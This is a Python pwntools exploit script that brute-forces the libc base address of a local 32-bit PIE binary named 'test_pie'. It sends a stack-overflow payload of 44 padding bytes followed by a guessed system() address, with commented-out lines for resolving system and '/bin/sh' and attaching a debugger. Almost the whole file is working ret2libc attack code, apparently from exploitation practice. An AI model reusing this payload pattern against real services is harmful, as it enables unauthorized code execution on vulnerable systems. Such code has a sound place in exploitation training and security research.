from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc_base = 0x00100000
system_off = 0x80000610
i = 0x1000
#system_addr = libc_base + system_off
#while True:
#p = process("./test_pie")

while(i < 0x100000):
	print "libc base = " + hex(i)

#libc = ELF("/lib/libc.so.6")
#test_ennx = p.elf


#off_system = libc.symbols['system']
#off_binsh = libc.search('/bin/sh').next()

#print 'system  addr: ' + hex(libc.symbols['system']) 
#print "/bin/sh addr: " + hex(libc.search('/bin/sh').next())

#system_addr = off_system  + p.libc.address
#bin_sh_addr = off_binsh + p.libc.address
#saved_eip = 0x607d28


#print 'system  addr: ' + hex(system_addr) 
#print 'system  addr: ' + hex(p.libc.symbols['system']) 
#print "/bin/sh addr: " + hex(bin_sh_addr)
#print "/bin/sh addr: " + hex(p.libc.search('/bin/sh').next())
#print "system got addr: " + hex(p.elf.got['system'])
#print "shell0 addr: " + hex(p.elf.symbols['shell0'])
#print "shell0 addr: " + hex(p.elf.symbols['shell0'])
#main_base = 0x80000000

#p = gdb.debug(["./test_pie"], '''
#break main
#b 26
#r
#n
#x/32x $sp
#''')
	system_addr = i + system_off
	print "system addr: " + hex(system_addr)
	p = process("./test_pie")
	p.recvline()
	#shell_addr = 0x80000000 + p.elf.symbols['shell0']
	payload = 'A'*44 +  p32(system_addr)
	print payload
	p.sendline(payload)

#time.sleep(300)
	p.recvall()
#p.interactive()
	#p.close()
	i = i + 0x1000

	p.close()
